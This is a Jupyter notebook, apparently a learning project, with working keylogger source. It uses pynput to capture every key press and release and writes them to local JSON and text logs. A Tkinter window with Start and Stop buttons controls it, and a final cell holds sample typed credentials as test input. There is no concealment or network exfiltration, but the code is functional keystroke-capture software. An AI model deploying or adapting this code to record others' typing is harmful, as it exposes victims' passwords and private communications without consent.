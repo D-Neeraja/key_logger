{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "82ff2dfe",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pynput in /home/rgukt/anaconda3/lib/python3.9/site-packages (1.7.7)\n",
      "Requirement already satisfied: python-xlib>=0.17 in /home/rgukt/anaconda3/lib/python3.9/site-packages (from pynput) (0.33)\n",
      "Requirement already satisfied: evdev>=1.3 in /home/rgukt/anaconda3/lib/python3.9/site-packages (from pynput) (1.7.1)\n",
      "Requirement already satisfied: six in /home/rgukt/anaconda3/lib/python3.9/site-packages (from pynput) (1.16.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a219e7a6",
   "metadata": {},
   "outputs": [],
   "source": [
    "import tkinter as tk\n",
    "from tkinter import *\n",
    "from pynput import keyboard\n",
    "import json\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1adddf7b",
   "metadata": {},
   "outputs": [],
   "source": [
    "keys_used = []\n",
    "flag = False\n",
    "keys = \"\"\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "6c57e4d6",
   "metadata": {},
   "outputs": [],
   "source": [
    "def generate_text_log(key):\n",
    "    with open('key_log.txt', \"w+\") as keys:\n",
    "        keys.write(key)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "9fb0631c",
   "metadata": {},
   "outputs": [],
   "source": [
    "def generate_json_file(keys_used):\n",
    "    with open('key_log.json', '+wb') as key_log:\n",
    "        key_list_bytes = json.dumps(keys_used).encode()\n",
    "        key_log.write(key_list_bytes)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "fc79c4d2",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    global flag, keys_used, keys\n",
    "    if flag == False:\n",
    "        keys_used.append(\n",
    "            {'Pressed': f'{key}'}\n",
    "        )\n",
    "        flag = True\n",
    "\n",
    "    if flag == True:\n",
    "        keys_used.append(\n",
    "            {'Held': f'{key}'}\n",
    "        )\n",
    "    generate_json_file(keys_used)\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "4622e97d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_release(key):\n",
    "    global flag, keys_used, keys\n",
    "    keys_used.append(\n",
    "        {'Released': f'{key}'}\n",
    "    )\n",
    "\n",
    "    if flag == True:\n",
    "        flag = False\n",
    "    generate_json_file(keys_used)\n",
    "\n",
    "    keys = keys + str(key)\n",
    "    generate_text_log(str(keys))\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "d0c68b21",
   "metadata": {},
   "outputs": [],
   "source": [
    "def start_keylogger():\n",
    "    global listener\n",
    "    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\n",
    "    listener.start()\n",
    "    label.config(text=\"[+] Keylogger is running!\\n[!] Saving the keys in 'keylogger.txt'\")\n",
    "    start_button.config(state='disabled')\n",
    "    stop_button.config(state='normal')\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "f9cd7a13",
   "metadata": {},
   "outputs": [],
   "source": [
    "def stop_keylogger():\n",
    "    global listener\n",
    "    listener.stop()\n",
    "    label.config(text=\"Keylogger stopped.\")\n",
    "    start_button.config(state='normal')\n",
    "    stop_button.config(state='disabled')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6da4c03f",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "root = Tk()\n",
    "root.title(\"Keylogger\")\n",
    "\n",
    "label = Label(root, text='Click \"Start\" to begin keylogging.')\n",
    "label.config(anchor=CENTER)\n",
    "label.pack()\n",
    "\n",
    "start_button = Button(root, text=\"Start\", command=start_keylogger)\n",
    "start_button.pack(side=LEFT)\n",
    "\n",
    "stop_button = Button(root, text=\"Stop\", command=stop_keylogger, state='disabled')\n",
    "stop_button.pack(side=RIGHT)\n",
    "\n",
    "root.geometry(\"250x250\")\n",
    "\n",
    "root.mainloop()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7dceb12",
   "metadata": {},
   "outputs": [],
   "source": [
    "name : Neeraj\n",
    "email : abc@gmail.com\n",
    "psswd : 1234567890\n",
    "hello, hi, this is neeraja"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
